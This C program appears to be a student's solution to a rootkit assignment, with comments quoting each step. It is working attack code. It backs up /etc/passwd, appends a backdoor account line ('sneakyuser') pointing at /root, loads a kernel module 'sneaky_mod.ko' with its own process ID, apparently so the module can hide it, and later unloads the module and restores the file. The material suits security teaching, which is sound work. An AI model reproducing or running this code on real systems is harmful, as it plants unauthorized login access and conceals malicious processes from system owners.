#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<unistd.h>

// execute a command function: take in the command path and arguments, execute it and return
void execute_command(const char* command, char* const args[]) {
    pid_t pid = fork();
    if(pid == -1) {
        perror("fork error");
        exit(EXIT_FAILURE);
    }
    else if(pid > 0) { //parent process
        int wstatus;
        int wait = waitpid(pid, &wstatus, 0);
        if(wait == -1) {
            perror("waitpid error");
            exit(EXIT_FAILURE);
        }
    }
    else { //child process
        execv(command, args);
        perror("execute error");//exec should never return
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    /* 1. Your program should print its own process ID to the screen */
    int pid = getpid();
    printf("sneaky_process pid = %d\n", pid);

    /* 2. Your program will perform 1 malicious act. It will copy the 
        /etc/passwd file (used for user authentication) to a new file: 
        /tmp/passwd. Then it will open the /etc/passwd file and print 
        a new line to the end of the file that contains a username and 
        password that may allow a desired user to authenticate to the 
        system. */
    char* const cp_args[] = {"/bin/cp", "/etc/passwd", "/tmp/passwd", 0};
    execute_command("/bin/cp", cp_args);

    FILE *fptr;
    fptr = fopen("/etc/passwd", "a"); //open for append
    if(fptr == NULL) {
        perror("fopen error");
        exit(EXIT_FAILURE);
    }
    fprintf(fptr, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(fptr);

    /* 3. Your program will load the sneaky module (sneaky_mod.ko) using 
        the “insmod” command. Your sneaky program will also pass its 
        process ID into the module. */
    char pid_arg[20];
    sprintf(pid_arg, "sneaky_pid=%d", pid);
    char* const insmod_args[] = {"sbin/insmod", "sneaky_mod.ko", pid_arg, 0};
    execute_command("/sbin/insmod", insmod_args);
    //printf("Loaded the sneaky module");

    /* 4. Your program will then enter a loop, reading a character at a 
        time from the keyboard input until it receives the character ‘q’ 
        (for quit). Then the program will exit this waiting loop.  */
    //printf("Now input whatever you want and enter 'q' to quit...\n");
    char c = '0';
    while(c != 'q') {
        c = getchar(); 
    }

    /* 5. Your program will unload the sneaky kernel module using the “rmmod” command */
    //printf("unloading the sneaky kernel...\n");
    char* const rmmod_args[] = {"/sbin/rmmod", "sneaky_mod.ko", 0};
    execute_command("/sbin/rmmod", rmmod_args);
    //printf("unloaded the sneaky kernel\n");

    /* 6. Your program will restore the /etc/passwd file (and remove the 
        addition of “sneakyuser” authentication information) by copying 
        /tmp/passwd to /etc/passwd. */
    char* const cp_back_args[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd", 0};
    execute_command("/bin/cp", cp_back_args);
    //printf("restored the /etc/passwd file\n");

    return 0;
}